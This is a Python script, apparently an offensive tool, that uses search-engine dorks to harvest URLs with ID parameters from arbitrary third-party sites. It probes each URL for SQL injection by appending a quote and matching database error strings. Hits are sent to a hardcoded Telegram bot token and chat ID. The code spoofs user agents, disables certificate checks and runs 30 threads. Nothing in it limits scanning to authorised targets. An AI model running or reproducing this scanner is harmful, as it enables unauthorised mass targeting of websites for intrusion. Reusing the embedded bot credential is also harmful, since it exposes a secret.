import requests
import threading
import random
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import urllib3
import os
import shutil
from termcolor import colored
from tqdm import tqdm

urllib3.disable_warnings()

SEARCH_ENGINES = {
    'google': 'https://www.google.com/search?q={}',
    'bing': 'https://www.bing.com/search?q={}',
    'yahoo': 'https://search.yahoo.com/search?p={}',
    'duckduckgo': 'https://duckduckgo.com/html?q={}'}

BLOCKED_DOMAINS = {
    'youtube.com', 'google.com', 'facebook.com', 'cmkoo.com.hk', 'embryohotel.com', 'microsoft.com', 'github.com',
    'amazon.com', 'stackoverflow.com', 'linkedin.com', 'twitter.com', 'instagram.com'
}

TELEGRAM_TOKEN = '8048547565:AAHmmDDUZmvt1yUcjSgyghxT3N0sOSX9aNY'
TELEGRAM_CHAT_ID = '-4786720095'

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        print(colored(f"[Telegram Error] {e}", 'red'))

dorks = [
    "inurl:.php?id=",
    "inurl:.asp?id=",
    "inurl:product.php?id=",
    "inurl:category.php?id=",
    "inurl:news.php?id=",
    "inurl:index.php?id=",
    "inurl:item.php?id=",
    "inurl:view.php?id=",
    "inurl:article.php?id=",
    "inurl:show.php?id=",
    "inurl:gallery.php?id=",
    "inurl:event.php?id=",
    "inurl:download.php?id=",
    "inurl:main.php?id=",
    "inurl:review.php?id=",
    "inurl:process.php?id=",
    "inurl:plugin.php?id=",
    "inurl:readme.php?id=",
    "inurl:profile.php?id=",
    "inurl:about.php?id=",
    "inurl:file.php?id=",
    "inurl:user.php?id=",
    "inurl:page.php?pid=",
    "inurl:forum.php?topic=",
    "inurl:thread.php?tid=",
    "inurl:message.php?id=",
    "inurl:cart.php?id=",
    "inurl:shop.php?item=",
    "inurl:view_item.php?id=",
    "inurl:game.php?id=",
    "inurl:store.php?id=",
    "inurl:details.php?id=",
    "inurl:product_info.php?product_id=",
    "inurl:services.php?id=",
    "inurl:info.php?id=",
    "inurl:faq.php?id=",
    "inurl:press.php?id=",
    "inurl:showthread.php?tid=",
    "inurl:play.php?id=",
    "inurl:portfolio.php?id=",
    "inurl:content.php?id=",
    "inurl:display.php?did=",
    "inurl:record.php?id=",
    "inurl:case.php?id=",
    "inurl:report.php?id=",
    "inurl:episode.php?id=",
    "inurl:ticket.php?id="
]

sql_errors = [
    "mysql_fetch_array()",
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "mysqli_fetch_array",
    "Error Executing Database Query",
    "Unclosed quotation mark after the character string",
    "Microsoft OLE DB Provider for SQL Server",
    "java.sql.SQLException",
    "org.hibernate.exception",
    "Query failed: ERROR",
    "supplied argument is not a valid MySQL result resource",
    "PG::SyntaxError",
    "SQLSTATE[42000]",
    "SQLite3::query(): Unable to prepare statement",
    "Fatal error: Uncaught exception 'PDOException'"
]

ua = UserAgent()
lock = threading.Lock()
scanned_urls = set()
vulnerable_sites = set()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text):
    try:
        terminal_width = shutil.get_terminal_size().columns
    except:
        terminal_width = 80
    lines = text.split('\n')
    centered_lines = []
    for line in lines:
        if line.strip():
            padding = (terminal_width - len(line)) // 2
            centered_lines.append(' ' * padding + line)
        else:
            centered_lines.append(line)
    return '\n'.join(centered_lines)

def print_banner():
    clear()
    banner = '''
⠀⠀⠀⠀⠀⢸⣿⣷⣶⣤⣀⣤⣴⣶⣶⣶⣶⣦⣤⣀⣤⣶⣾⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
⠀⠀⠠⣤⣀⡀⠹⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⠃⢀⣀⣤⠄⠀⠀
⢀⠤⢤⣤⣬⣙⠳⣿⣿⡿⠀⢀⠀⠈⣿⣿⠁⠀⡀⠈⣿⣿⣿⠞⣋⣥⣤⠤⠤⡀
⠀⢀⡤⠤⢤⣼⣿⣿⣿⣿⡀⠸⠀⣠⣿⣿⣄⠐⠇⢀⣿⣿⣿⣿⣧⡤⠤⢤⡀⠀
⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠛⠿⢿⣿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⣿⡿⠻⠛⠀⠀⠀
'''
    print(colored(center_text(banner), 'red', attrs=['bold']))
    print(colored(center_text("Developed by Layos"), 'yellow', attrs=['bold']))

def get_random_headers():
    return {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }

def normalize_url(url):
    return url.split('?')[0]

def search_urls(dork):
    urls = set()
    for engine in SEARCH_ENGINES.keys():
        try:
            response = requests.get(
                SEARCH_ENGINES[engine].format(dork),
                headers=get_random_headers(),
                verify=False,
                timeout=5
            )
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a'):
                    url = link.get('href', '')
                    if any(d in url for d in ['.php?', '.asp?']):
                        if not any(bd in url for bd in BLOCKED_DOMAINS):
                            normalized_url = normalize_url(url)
                            if normalized_url not in scanned_urls:
                                urls.add(url)
                                scanned_urls.add(normalized_url)
        except:
            continue
    return urls

def check_sqli(url):
    try:
        response = requests.get(url + "'", headers=get_random_headers(), verify=False, timeout=1)
        content = response.text.lower()
        return any(error.lower() in content for error in sql_errors)
    except:
        return False

def update_progress(url):
    print(colored(f"Scanning: {url}", 'cyan', attrs=['bold']), end='\r')

def worker(dork):
    try:
        urls = search_urls(dork)
        for url in urls:
            update_progress(url)
            if check_sqli(url) and url not in vulnerable_sites:
                with lock:
                    vulnerable_sites.add(url)
                    print(colored(f"\n[+] Vulnerable: {url}", 'red', attrs=['bold']))
                    send_telegram_message(f"[+] SQLi Detected:\n{url}")
    except:
        pass

def main():
    print_banner()
    thread_count = 30
    threads = []
    random.shuffle(dorks)

    for dork in dorks:
        t = threading.Thread(target=worker, args=(dork,))
        t.daemon = True
        t.start()
        threads.append(t)

        if len(threads) >= thread_count:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Exiting...", 'red', attrs=['bold']))
        exit(0)
        
